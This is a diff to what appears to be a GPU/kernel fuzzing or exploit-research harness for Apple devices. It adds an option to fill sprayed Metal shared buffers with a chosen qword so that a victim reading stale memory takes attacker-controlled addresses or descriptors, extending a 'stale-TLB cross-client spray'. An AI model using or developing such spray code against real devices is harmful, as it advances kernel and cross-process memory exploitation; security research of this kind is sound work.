@@ -17845,8 +17845,13 @@ static void p_uatrec(void) {
             LOG("[uatrec] S4: VSZ 0x%x < 0x10000 (v91) — falling back to 0x10000", vsz);
             vsz = 0x10000;
         }
-        LOG("[uatrec] S4 stale-TLB cross-client spray: %d rounds, cong %d, %dms/round, secs %d, nv %d, vsz 0x%x",
-            rounds, cong, roundms, secs, nv, vsz);
+        // content steering: if FILL is set, bufA is the qword repeated over the
+        // whole vsz and NO page markers — any field a consumer reads as an
+        // address/descriptor is OUR value. Unset = 0x41 + USK_STLE markers.
+        const char *fills = getenv("FUZZ_UATREC_S4_FILL");
+        uint64_t fill = fills ? strtoull(fills, NULL, 0) : 0;
+        LOG("[uatrec] S4 stale-TLB cross-client spray: %d rounds, cong %d, %dms/round, secs %d, nv %d, vsz 0x%x, fill 0x%llx%s",
+            rounds, cong, roundms, secs, nv, vsz, fill, fills ? "" : " (0x41+markers)");
 
         // system GPU load on the main thread: keep the screen on and make
         // WindowServer composite continuously (fresh GPU buffer allocs)
@@ -17956,10 +17961,19 @@ static void p_uatrec(void) {
                 // panic/gpuEvent DVA dumps correlate back to this spray
                 id<MTLBuffer> bufA = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
                 uint8_t *pa = (uint8_t *)[bufA contents];
-                memset(pa, 0x41, vsz);
-                for (int pg = 0; pg < vsz / 0x4000; pg++) {
-                    *(uint64_t *)(pa + pg * 0x4000) = 0x454c54535f4b5355ULL;  // "USK_STLE"
-                    *(uint64_t *)(pa + pg * 0x4000 + 8) = ((uint64_t)round << 32) | (uint32_t)pg;
+                if (fills) {
+                    // pure qword pattern — clean content steering, no markers
+                    uint64_t *qw = (uint64_t *)pa;
+                    for (int i = 0; i < vsz / 8; i++) qw[i] = fill;
+                } else {
+                    // page-indexed pattern — each 16KB page starts with qword
+                    // "USK_STLE" + qword (round<<32 | page) for panic/gpuEvent
+                    // DVA correlation
+                    memset(pa, 0x41, vsz);
+                    for (int pg = 0; pg < vsz / 0x4000; pg++) {
+                        *(uint64_t *)(pa + pg * 0x4000) = 0x454c54535f4b5355ULL;  // "USK_STLE"
+                        *(uint64_t *)(pa + pg * 0x4000 + 8) = ((uint64_t)round << 32) | (uint32_t)pg;
+                    }
                 }
                 // NV victim blits: own cb + own bufD per victim, each patched to
                 // its victim's gpuvaV (gscan_patch cache built by self-patch on
@@ -18020,8 +18034,8 @@ static void p_uatrec(void) {
                     uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
                     if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
                 }
-                LOG("[uatrec] S4 r%d (+%lds): nvv %d ncb %d vsz 0x%x destroy0 kr 0x%08x nj %d",
-                    round, el / 1000, nvv, ncb, vsz, kd0, nj);
+                LOG("[uatrec] S4 r%d (+%lds): nvv %d ncb %d vsz 0x%x fill 0x%llx destroy0 kr 0x%08x nj %d",
+                    round, el / 1000, nvv, ncb, vsz, fill, kd0, nj);
                 for (int v = 0; v < ncb; v++)
                     LOG("[uatrec] S4 r%d blit[%d] slots %ld ridp %d", round, v, nps[v], ridps[v]);
             }
